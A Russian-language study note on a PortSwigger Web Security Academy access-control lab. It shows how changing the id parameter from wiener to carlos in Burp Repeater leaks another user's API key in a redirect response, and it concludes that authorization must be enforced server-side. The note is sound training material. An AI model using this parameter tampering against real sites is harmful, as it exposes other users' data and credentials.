лаба
https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect

случаи когда пользователю не разрешен доступ к ресурсу, и возвращает перенаправление на страницу входа в систему С УТЕЧКОЙ ДАННЫХ

задание:
 получите ключ API для пользователя `carlos`

------

вот запрос к моей стр

```http
GET /my-account?id=wiener HTTP/2
Host: 0a7f003c032031fa80602b0800bf0026.web-security-academy.net
Cookie: session=ar1uQitWwvjptDKWy0kiBxqnB5b3Tkbu
...
..
.
```

я просто поменял в репитере: GET /my-account?id=wiener на
GET /my-account?id=carlos

и получил апи ключ d914eBdpgPwgiQTEHtjGgjYBY9EDbupQ
 и лаба решена!

![[sss2026-03-0123.49.57.png]]
```html
<div>Your API Key is: d914eBdpgPwgiQTEHtjGgjYBY9EDbupQ</div><br/>
```
-----

но если я тоже самое сделаю через адресную строку в браузере

и браузер тут же молниеносно выкинет меня из аккаунта, и визуально я у вижу никаких данных!

но вот через репитер - вижу что  в ответном запросе мне сразу приходит ответ с данными жертвы

----

вывод

получается так, что страница браузере занимается проверкой того, к каким резурсам/данным/ запросам имеет текущий юзер, поэтому это все можно перехватывать, этим всем должен заниматься сервер!!!